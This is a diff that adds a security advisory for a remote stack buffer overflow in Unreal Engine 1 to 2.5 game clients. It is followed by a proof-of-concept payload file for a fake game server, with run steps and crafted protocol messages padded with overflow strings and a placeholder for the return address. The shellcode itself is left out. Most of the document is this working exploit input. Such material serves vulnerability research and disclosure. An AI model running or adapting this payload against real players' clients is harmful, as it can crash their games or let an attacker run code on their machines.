@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/41424/info
+
+Unreal Engine is prone to a remote stack-based buffer-overflow vulnerability because it fails to properly bounds-check messages before copying them to an insufficiently sized memory buffer.
+
+Successful exploits can allow remote attackers to execute arbitrary machine code in the context of the user running the application.
+
+This issue affects games based on Unreal Engine 1, 2, and 2.5; other versions may be affected as well.
+
+
+// Unreal engine <= 2.5 clients unicode buffer-overflow in UpdateConnectingMessage
+// by Luigi Auriemma
+// e-mail: aluigi@autistici.org
+// web:    aluigi.org
+//
+// Advisory:
+// http://aluigi.org/adv/unrealcbof-adv.txt
+//
+// - http://aluigi.org/testz/unrealts.zip
+// - launch it: unrealts 7777 unrealcbof.txt
+// - launch a game based on the Unreal engine
+// - open the console (~)
+// - type: open 127.0.0.1:7777
+// - it's also possible to launch directly the game: game.exe 127.0.0.1:7777
+
+// CHALLENGE can be random
+CHALLENGE CHALLENGE=12345678
+
+// GUID can be random
+USES GUID=FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF PKG=bof FLAGS=1 SIZE=1 FNAME=bof
+
+// some games like SWAT4 require that LEVEL of WELCOME and this PKG are the same
+USES GUID=FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF PKG=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxxxxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA FLAGS=1 SIZE=1 FNAME=bof
+
+// enable any possible type of download
+DLMGR CLASS=Engine.ChannelDownload PARAMS=Enabled COMPRESSION=0
+DLMGR CLASS=IpDrv.HTTPDownload PARAMS=http://127.0.0.1/ COMPRESSION=0
+
+// LEVEL must contain the overflow and shellcode (the UDP packet must be max 576 bytes or less for some games)
+WELCOME LEVEL=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxxxxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA LONE=0
